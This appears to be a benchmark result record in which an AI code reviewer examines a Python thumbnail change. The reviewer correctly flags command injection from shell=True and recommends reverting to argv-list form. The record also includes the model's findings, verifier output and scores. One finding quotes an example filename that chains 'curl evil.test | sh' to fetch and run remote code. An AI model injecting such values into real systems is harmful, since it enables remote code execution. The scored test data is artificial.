@@ -1,0 +1,92 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 51.7,
+  "setup_seconds": 0.0,
+  "total_seconds": 51.8,
+  "usage": {
+    "in": 30902,
+    "cache_read": 88576,
+    "cache_write": 0,
+    "out": 2392,
+    "source": "cli"
+  },
+  "cost_usd": 0.1027288,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "`subprocess.run(..., shell=True)` with an f-string that embeds `upload_dir`, `name`, and `oid` lets those values be interpreted by the shell. A filename such as `a; curl evil.test | sh` (or any value with `;`, `|`, `$()`, backticks, spaces) executes arbitrary commands as the converter user and can overwrite paths outside `/srv/thumbs/`.\n\nThe previous argv-list form (`[\"/usr/bin/convert\", src, dst]`) avoided this entirely. Restore `shell=False` and a fixed executable path; address any ImageMagick 7 policy/delegate need in IM config rather than by shelling out. If a shell is unavoidable, every dynamic segment must be escaped (e.g. `shlex.quote`) \u2014 argv-list remains the correct default.\n\n```suggestion\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        # do not use shell=True \u2014 paths are attacker-influenced\n```"
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity": "warning",
+      "body": "The command switched from `/usr/bin/convert` to bare `convert`, so the shell resolves the binary via `PATH`. On a shared or compromised runner that can put another `convert` earlier in `PATH`, thumbnail generation runs attacker-controlled code.\n\nKeep an absolute path to the ImageMagick binary (IM7 often uses `/usr/bin/magick` rather than `convert`) when restoring the argv-list form."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a command-injection vulnerability by switching thumbnail conversion from argv-list `subprocess.run` to `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`.\n\n## Why this is blocking\n\nThe previous form passed each argument as a separate argv element to `/usr/bin/convert`, so shell metacharacters in filenames could not alter the command. The new form builds a single shell string:\n\n```python\nf\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\"\n```\n\nAny value containing spaces, `;`, `|`, `$()`, backticks, or similar is interpreted by the shell. A crafted upload name (or `upload_dir` / `oid`) can run arbitrary commands as the process user and write outside `/srv/thumbs/`.\n\nThe removed comment claimed upstream `ALLOWED_FILES` validation for `name` only. Even if that regex still exists elsewhere, `upload_dir` and `oid` were never covered by that note, and shell quoting is still required when using `shell=True`. Validation is also easy to regress; argv-list form does not depend on it.\n\n## Safer direction for IM7\n\nIf ImageMagick 7 needs a policy/delegate adjustment, keep the argv-list form (or `shell=False` with a fixed executable path) and fix the IM policy/delegate configuration separately. If a shell wrapper is truly unavoidable, pass a static command string and feed paths via a mechanism that does not interpolate into the shell (or use `shlex.quote` on every dynamic segment \u2014 still weaker than argv-list).\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The change replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string embedding `upload_dir`, `name`, and `oid` unescaped, so shell metacharacters in those values execute as the converter user. No upstream validation remains in-repo; severity critical is appropriate."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.699,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2582,
+      "out": 356
+    },
+    "cost_usd": 0.008273
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
